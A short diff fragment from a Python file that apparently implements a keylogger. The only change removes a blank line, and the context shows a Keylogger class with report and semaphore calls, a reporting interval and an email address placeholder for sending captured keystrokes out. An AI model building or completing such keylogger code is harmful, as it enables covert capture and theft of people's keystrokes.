@@ -44,7 +44,6 @@ class Keylogger:
         self.report()
         self.semaphore.acquire()
 
-
 if __name__ == "__main__":
     SEND_REPORT_EVERY = 20
     EMAIL_ADDRESS = "put_real_address_here@gmail.com"
